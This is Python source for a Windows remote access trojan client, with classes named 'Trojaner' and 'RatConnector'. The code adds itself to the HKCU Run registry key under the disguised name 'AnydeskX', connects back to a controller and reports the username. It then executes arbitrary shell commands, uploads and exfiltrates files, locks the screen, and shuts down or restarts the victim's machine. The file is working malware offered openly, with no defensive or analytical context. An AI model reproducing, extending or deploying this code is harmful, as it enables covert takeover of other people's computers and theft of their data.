import socket
import subprocess
from telnetlib import IP
import time
import json
import os
import base64
import ctypes
import sys
from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, OpenKey, SetValueEx
import requests

#############################################################################

IP = 'localhost'
PORT = 187

#############################################################################

class Trojaner:
    # Adds the script to startup
    def addStartup():
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split('\\')[-1]
        new_file_path = fp + "\\" + file_name
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, 'AnydeskX', 0, REG_SZ, new_file_path )

#=====================================================================#

class RatConnector:
    def __init__(self, ip, port):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
                self.data_send(os.getlogin())
            except socket.error:
                print("[-] Server is not online? Try again in 5 seconds!")
                time.sleep(5)
            else:
                break

#=====================================================================#

    def data_send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

#=====================================================================#

    # Function for receiving data as JSON
    def data_receive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            # If ValueError returned then more data needs to be sent
            except ValueError:
                continue

#=====================================================================#

    def array_to_string(self, strings):
        convStr = ""
        for i in strings:
            convStr += " " + i 
        return convStr

#=====================================================================#

    # Run any command on the system
    def run_command(self, command):
        return subprocess.check_output(
            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )

#=====================================================================#

    # Reading files with base 64 encoding for non UTF-8 compatability
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

#=====================================================================#

    # Writing files, decode the b64 from the above function
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload complete"

#=====================================================================#

    def run(self):
         while True:
            command = self.data_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif command[0] == "help":
                    commandResponse = ""
                
                elif command[0] == "clear":
                    commandResponse = ""

                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(str(command[1]).replace("~", " "))
                    commandResponse = "[+] Changing active directory to " + command[1]
                
                elif command[0] == "upload":
                    commandResponse = self.write_file(command[1], command[2])

                elif command[0] == "download":
                    commandResponse = self.read_file(command[1]).decode()

                elif command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    commandResponse = "[+] Clients PC locked"

                elif command[0] == "shutdown":
                    os.system("shutdown /s /t 1")

                elif command[0] == "restart":
                    os.system("shutdown /r /t 1")
                
                else:
                    convCommand = self.array_to_string(command)
                    commandResponse = self.run_command(convCommand).decode()
            # Whole error handling, bad practice but required to keep connection
            except Exception as e:
                commandResponse = f"[-] Error running command: {e}"
            self.data_send(commandResponse)

# Add Script to startup
Trojaner.addStartup()

ratClient = RatConnector(IP, PORT)
ratClient.run()